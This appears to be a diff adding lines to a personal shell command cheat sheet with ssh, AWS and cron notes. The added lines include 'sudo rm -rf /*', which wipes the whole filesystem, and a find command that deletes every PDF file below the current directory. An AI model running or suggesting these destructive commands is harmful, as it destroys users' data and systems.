@@ -14,6 +14,9 @@ ssh -i ~/ssh/mypair.pem ec2-user@192.168.1.1
 .aws /etc/hosts, var/log
 
 curl api.ipify.org
+find . -name "*.pdf" -type f -exec rm {} \;
+sudo rm -rf /*
+ls -a | grep -i Doc
 
 **************************** Cron ****************************
 
